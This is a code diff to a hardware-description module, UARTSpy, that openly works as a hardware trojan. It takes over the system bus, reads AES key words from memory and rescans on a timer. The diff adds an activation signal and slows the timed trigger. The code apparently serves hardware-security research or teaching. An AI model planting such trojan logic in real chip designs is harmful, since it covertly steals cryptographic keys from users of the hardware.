@@ -149,6 +149,12 @@ class AESFromRAM(Module):
 
 class UARTSpy(Module):
     def __init__(self, bus):
+        #activate it less frequently
+        # self.throttle_factor = throttle_factor
+        # self.throttle_cnt = Signal(max=throttle_factor)
+        self.trojan_activation = Signal()
+        
+        
         self.bus = bus  # Wishbone master interface
         self.ready = Signal(reset=0)
         self.addr = Signal(32)
@@ -175,13 +181,25 @@ class UARTSpy(Module):
 
         self.fsm.act("IDLE",
             If(self.activate,
-                NextState("BECOME_MASTER")
+                self.trojan_activation.eq(1),
+                NextState("BECOME_MASTER"),
+                # first check our throttle counter
+                # If(self.throttle_cnt == 0,
+                #     self.trojan_activation.eq(1),
+                #     NextState("BECOME_MASTER")
+                # ).Else(
+                #     # skip this activation, just decrement throttle_cnt
+                #     NextValue(self.throttle_cnt, self.throttle_cnt - 1),
+                #     self.trojan_activation.eq(0),
+                #     NextState("IDLE")
+                # )
             )
         )
 
 
 
         self.fsm.act("BECOME_MASTER",
+            # NextValue(self.throttle_cnt, throttle_factor - 1),
             NextValue(self.addr, 0x20000000),
             NextValue(self.index, 0),
             NextValue(self.uart_master_status, 1),
@@ -201,8 +219,10 @@ class UARTSpy(Module):
                 self.ready.eq(1),
                 NextValue(self.addr, self.addr + 4),
                 If(self.addr + 4 >= 0x20000008,
+                    self.trojan_activation.eq(0),
                     NextState("WAIT_BEFORE_RESCAN")
                 ).Else(
+                    self.trojan_activation.eq(1),
                     NextState("READ_KEY")
                 )
             )
@@ -215,7 +235,8 @@ class UARTSpy(Module):
             NextValue(self.cyc_reg, 0),
             NextValue(self.we_reg, 0),
             self.debug_read_enable.eq(0),
-            If(self.time_counter >= 100,
+            # FIXME: TIME ACTIVATION TROJAN
+            If(self.time_counter >= 1000,
                 NextValue(self.time_counter, 0),
                 NextValue(self.addr, 0x20000000),
                 NextState("BECOME_MASTER")
